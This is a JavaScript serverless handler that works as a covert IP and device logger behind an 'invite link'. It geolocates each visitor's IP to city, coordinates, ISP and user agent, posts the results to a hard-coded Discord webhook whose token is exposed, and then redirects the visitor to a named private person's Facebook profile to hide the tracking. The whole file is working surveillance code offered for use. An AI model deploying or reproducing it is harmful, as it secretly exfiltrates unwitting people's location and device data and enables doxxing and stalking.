import fetch from 'node-fetch';

const webhookUrl = "https://discord.com/api/webhooks/1306087539169296484/vP5BQM6ius3zPupcdWazfCNQNpuEFstMUeSYKpVJ5i_vxTxWpdyo2mWcHqQDXC7Y0Tr3";

async function sendToWebhook(message) {
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });
    } catch (error) {
        console.error("Failed to send data to webhook:", error);
    }
}

async function getIpDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP information:", error);
        return null;
    }
}

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const deviceInfo = await req.json();
            const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

            // Get IP details, including approximate coordinates
            const ipDetails = await getIpDetails(ip);

            const message = {
                username: "Device Info Logger",
                embeds: [
                    {
                        title: "Device Information",
                        color: 0x00FFFF,
                        description: "Device info collected from user clicking the invite link.",
                        fields: [
                            ...(Object.keys(deviceInfo).map(key => ({
                                name: key,
                                value: `\`${deviceInfo[key]}\``,
                                inline: true,
                            }))),
                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                            { name: "Latitude", value: `\`${ipDetails.lat || "Not available"}\``, inline: true },
                            { name: "Longitude", value: `\`${ipDetails.lon || "Not available"}\``, inline: true },
                        ]
                    }
                ]
            };

            await sendToWebhook(message);
            res.status(200).json({ message: "Device info logged." });
        } catch (error) {
            res.status(500).json({ message: "Failed to process request." });
        }
    } else if (req.method === 'GET') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const blacklistedIPs = ["716.147.210.120", "181.55.23.312"];

        if (blacklistedIPs.includes(ip)) {
            res.status(403).send("Forbidden: Your IP address is blacklisted.");
            return;
        }

        const ipDetails = await getIpDetails(ip);
        if (!ipDetails || ipDetails.status !== 'success') {
            res.status(500).send("Failed to retrieve IP information.");
            return;
        }

        const userAgent = req.headers['user-agent'] || 'Unknown';

        const message = {
            username: "IP Logger",
            embeds: [
                {
                    title: "Invite Link - IP Logged",
                    color: 0x00FFFF,
                    description: `**A User Clicked The Invite Link!**\n\n**Endpoint:** \`/api/invite\`\n\n**IP Info:**`,
                    fields: [
                        { name: "IP", value: `\`${ipDetails.query}\``, inline: true },
                        { name: "Provider", value: `\`${ipDetails.isp}\``, inline: true },
                        { name: "Country", value: `\`${ipDetails.country}\``, inline: true },
                        { name: "Region", value: `\`${ipDetails.regionName}\``, inline: true },
                        { name: "City", value: `\`${ipDetails.city}\``, inline: true },
                        { name: "Timezone", value: `\`${ipDetails.timezone}\``, inline: true },
                        { name: "Latitude", value: `\`${ipDetails.lat}\``, inline: true },
                        { name: "Longitude", value: `\`${ipDetails.lon}\``, inline: true },
                        { name: "Device Info", value: `\`${userAgent}\``, inline: false }
                    ],
                },
            ],
        };
        
        await sendToWebhook(message);
        
        res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
        res.end();
    } else {
        res.status(405).send("Method Not Allowed");
    }
}
